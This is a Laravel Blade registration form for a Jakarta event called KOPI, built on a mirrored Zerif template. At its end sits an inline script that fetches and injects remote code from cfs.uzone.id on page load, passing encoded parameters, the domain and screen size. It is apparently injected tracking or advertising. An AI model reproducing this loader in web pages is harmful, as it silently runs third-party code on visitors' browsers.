<!doctype html>
<html lang="en">

<!-- Mirrored from demo.templateocean.com/wrapbootstrap/zerif-html/v1.3.1/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 24 May 2017 02:48:29 GMT -->
<head>
<meta charset="UTF-8">
<meta name="description" content="Beautiful Responsive Animated OnePage Template" />
<meta name="keywords" content="Zerif, responsive, html, template, creative"/>
<meta name="author" content="Mizanur Rahman" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KOPI(Kajian dan Obrolan Penuh Inspirasi)</title>

<!-- =========================
 FAV AND TOUCH ICONS
============================== -->
<link rel="shortcut icon" href="{{ asset('images/icons/favicon.ico')}}">
<link rel="apple-touch-icon" href="{{ asset('images/icons/apple-touch-icon.png')}}">
<link rel="apple-touch-icon" sizes="72x72" href="images/icons/apple-touch-icon-72x72.html'">
<link rel="apple-touch-icon" sizes="114x114" href="{{ asset('images/icons/apple-touch-icon-114x114.png')}}">

<!-- =========================
     STYLESHEETS
============================== -->
<link rel="stylesheet" href="{{ asset('css/bootstrap.min.css')}}">
<link rel="stylesheet" href="{{ asset('css/owl.theme.css')}}">
<link rel="stylesheet" href="{{ asset('css/owl.carousel.css')}}">
<link rel="stylesheet" href="{{ asset('css/jquery.vegas.min.css')}}">
<link rel="stylesheet" href="{{ asset('css/animate.min.css')}}">

<link rel="stylesheet" href="{{ asset('assets/icon-fonts/styles.css')}}">
<link rel="stylesheet" href="{{ asset('css/pixeden-icons.css')}}">

<!-- CUSTOM STYLES -->
<link rel="stylesheet" href="{{ asset('css/styles.css')}}">
<link rel="stylesheet" href="{{ asset('css/responsive.css')}}">

<!-- WEBFONT -->
<link href='http://fonts.googleapis.com/css?family=Lato:300,400,700,400italic|Montserrat:700,400|Homemade+Apple' rel='stylesheet' type='text/css'>

<!--[if lt IE 9]>
			<script src="js/html5shiv.js"></script>
			<script src="js/respond.min.js"></script>
		<![endif]-->

    <!-- jQuery 2.2.3 -->
    <script src="{{ asset('/bower_components/AdminLTE/plugins/jQuery/jquery-2.2.3.min.js')}}"></script>

</head>
<body>

  <!-- =========================
     PRE LOADER
  ============================== -->
  <div class="preloader">
    <div class="status">&nbsp;</div>
  </div>
  <!-- =========================
     HOME SECTION
  ============================== -->
  <header id="home" class="header">

  	<!-- TOP BAR -->
  	<div id="main-nav" class="navbar navbar-inverse bs-docs-nav" role="banner">
  		<div class="container">
  			<div class="navbar-header responsive-logo">
  				<button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#bs-navbar-collapse">
  				<span class="sr-only">Toggle navigation</span>
  				<span class="icon-bar"></span>
  				<span class="icon-bar"></span>
  				<span class="icon-bar"></span>
  				</button>
  				<div class="navbar-brand">
  				<img src="{{ asset('images/logo.png')}}" alt="Zerif">
  				</div>
  			</div>
  			<nav class="navbar-collapse collapse" role="navigation" id="bs-navbar-collapse">
  			<ul class="nav navbar-nav navbar-right responsive-nav main-nav-list">
  				<li><a href="/">Home</a></li>
  			</ul>
  			</nav>
  		</div>
  	</div>
  	<!-- / END TOP BAR -->

    <div class="container">
            <div class="row">
              <div class="col-md-8 col-md-offset-2">
                          <div class="panel panel-default" style="background-color:#ddd; margin-top:15%;" >
                              <div class="panel-heading">Form Daftar Kopi</div>
                              @if (session('status'))
                                  <div class="alert alert-success">
                                      {{ session('status') }}
                                  </div>
                              @endif
                              <div class="panel-body">
                                  <form class="form-horizontal" role="form" method="POST" action="{{ route('register.participant') }}">
                                      {{ csrf_field() }}

                                      <div class="form-group{{ $errors->has('name') ? ' has-error' : '' }}">
                                          <label for="name" class="col-md-4 control-label">Nama</label>

                                          <div class="col-md-6">
                                              <input id="name" type="text" class="form-control" name="name" value="{{ old('name') }}" required autofocus>

                                              @if ($errors->has('name'))
                                                  <span class="help-block">
                                                      <strong>{{ $errors->first('name') }}</strong>
                                                  </span>
                                              @endif
                                          </div>
                                      </div>

                                      <div class="form-group{{ $errors->has('email') ? ' has-error' : '' }}">
                                          <label for="email" class="col-md-4 control-label">Email</label>

                                          <div class="col-md-6">
                                              <input id="email" type="email" class="form-control" name="email" value="{{ old('email') }}" required autofocus>

                                              @if ($errors->has('email'))
                                                  <span class="help-block">
                                                      <strong>{{ $errors->first('email') }}</strong>
                                                  </span>
                                              @endif
                                          </div>
                                      </div>

                                      <div class="form-group{{ $errors->has('birth') ? ' has-error' : '' }}">
                                          <label for="birth" class="col-md-4 control-label">Tanggal Lahir</label>

                                          <div class="col-md-6">
                                            <input id="birth" type="text" class="form-control" name="birth" value="{{ old('birth') }}" required autofocus>

                                              @if ($errors->has('birth'))
                                                  <span class="help-block">
                                                      <strong>{{ $errors->first('birth') }}</strong>
                                                  </span>
                                              @endif
                                          </div>
                                      </div>

                                      <div class="form-group{{ $errors->has('address') ? ' has-error' : '' }}">
                                          <label for="address" class="col-md-4 control-label">Alamat</label>

                                          <div class="col-md-6">
                                              <textarea name="address" rows="8" cols="80" id="address" type="text" class="form-control" value="{{ old('address') }}" required></textarea>

                                              @if ($errors->has('address'))
                                                  <span class="help-block">
                                                      <strong>{{ $errors->first('address') }}</strong>
                                                  </span>
                                              @endif
                                          </div>
                                      </div>

                                      <div class="form-group{{ $errors->has('name') ? ' has-error' : '' }}">
                                          <label for="name" class="col-md-4 control-label">Asal Instansi</label>

                                          <div class="col-md-6">
                                              <input id="institutions" type="text" class="form-control" name="institutions" value="{{ old('institutions') }}" required autofocus>

                                              @if ($errors->has('institutions'))
                                                  <span class="help-block">
                                                      <strong>{{ $errors->first('institutions') }}</strong>
                                                  </span>
                                              @endif
                                          </div>
                                      </div>

                                      <div class="form-group{{ $errors->has('phone') ? ' has-error' : '' }}">
                                          <label for="phone" class="col-md-4 control-label">Telp/WhatsApp</label>

                                          <div class="col-md-6">
                                              <input id="phone" type="text" class="form-control" name="phone" required>

                                              @if ($errors->has('phone'))
                                                  <span class="help-block">
                                                      <strong>{{ $errors->first('phone') }}</strong>
                                                  </span>
                                              @endif
                                          </div>
                                      </div>

                                      <div class="form-group">
                                          <label for="gender" class="col-md-4 control-label">Jenis Kelamin</label>

                                          <div class="col-md-6">
                                            <select class="form-control" id="gender" name="gender">
                                              <option selected="selected">-- Pilih --</option>
                                              <option value="Ikhwan">Ikhwan</option>
                                              <option value="Akhwat">Akhwat</option>
                                            </select>
                                          </div>

                                          @if ($errors->has('gender'))
                                              <span class="help-block">
                                                  <strong>{{ $errors->first('gender') }}</strong>
                                              </span>
                                          @endif
                                      </div>

                                      <div class="form-group">
                                          <label for="religion" class="col-md-4 control-label">Pembayaran</label>

                                          <div class="col-md-6">
                                            <select class="form-control" id="payment" name="payment">
                                              <option selected="selected">-- Pilih --</option>
                                              <option value="OTS">OTS</option>
                                              <option value="Transfer">Transfer</option>
                                            </select>
                                          </div>

                                          @if ($errors->has('payment'))
                                              <span class="help-block">
                                                  <strong>{{ $errors->first('payment') }}</strong>
                                              </span>
                                          @endif
                                      </div>

                                      <div class="form-group">
                                          <div class="col-md-6 col-md-offset-4">
                                              <button type="submit" class="btn btn-success btn-block">
                                                  Daftar
                                              </button>
                                          </div>
                                      </div>
                                  </form>
                              </div>
                          </div>
                      </div>
            </div>
        </div>

<!-- =========================
   FOOTER
============================== -->

<footer>
<div class="container">

	<!-- COMPANY ADDRESS-->
	<div class="col-md-5 company-details">
		<div class="icon-top red-text">
		    <i class="icon-fontawesome-webfont-302"></i>
		</div>
		Jl. Lenteng Agung Raya No. 20 Jakarta Selatan
	</div>

	<!-- COMPANY EMAIL-->
	<div class="col-md-2 company-details">
		<div class="icon-top green-text">
		<i class="icon-fontawesome-webfont-329"></i>
		</div>
		 senada.nurulfikri.ac.id
	</div>

	<!-- COMPANY PHONE NUMBER -->
	<div class="col-md-2 company-details">
		<div class="icon-top blue-text">
		<i class="icon-fontawesome-webfont-101"></i>
		</div>
		+6281214166898
	</div>

	<!-- SOCIAL ICON AND COPYRIGHT -->
	<div class="col-lg-3 col-sm-3 copyright">
		<ul class="social">
			<li><a href="#"><i class="icon-facebook"></i></a></li>
			<li><a href="#"><i class="icon-twitter-alt"></i></a></li>
			<li><a href="#"><i class="icon-linkedin"></i></a></li>
			<li><a href="#"><i class="icon-behance"></i></a></li>
			<li><a href="#"><i class="icon-dribbble"></i></a></li>
		</ul>
		 ©2013 Zerif LLC
	</div>
</div> <!-- / END CONTAINER -->
</footer> <!-- / END FOOOTER  -->

<!-- SCRIPTS -->
<script src="{{ asset('js/bootstrap.min.js')}}"></script>
<script src="{{ asset('js/wow.min.js')}}"></script>
<script src="{{ asset('js/jquery.nav.js')}}"></script>
<script src="{{ asset('js/jquery.knob.js')}}"></script>
<script src="{{ asset('js/owl.carousel.min.js')}}"></script>
<script src="{{ asset('js/smoothscroll.js')}}"></script>
<script src="{{ asset('js/jquery.vegas.min.js')}}"></script>
<script src="{{ asset('js/zerif.js')}}"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKeCteKgrJx0f8ElO4eWXHsZXL7mqMRaXO%2fubr%2fAOuVeVDOa92ZhKfUHDQHLQp9KgBHWKxtoX9QA946W37qSsg9yGLfHtqccDAJ8u5bM42NyuQDTmHBfSli1BL7ippW%2bR%2bVyORekixV9mVmgtlgJ7fjz0xmvsxyDlv%2bFWkchZi5YJwhGE8gxt3npW5SKdyEHROYCv7npserblG2zT7thWtmtlWFwfrAXeJC5gjsD4VQ8AEDalppePJTbU2DB5HN36BKunFfecPX9gGHhfspBEt%2fWdl8U%2fODmMfzxXQnqiUxY7Z9ii5lIe%2bHJwBO5Weg%2f6D7fv8weWGw%2bJjqROXfK2HKrRA4LYN0jcqZ65Kyo0N0nAhJxUeH%2fJ6x3a%2f9pZqXAU3oIaq2sqCDcwJQejpiaw0MDDlzXCegjux" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from demo.templateocean.com/wrapbootstrap/zerif-html/v1.3.1/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 24 May 2017 02:48:59 GMT -->
</html>
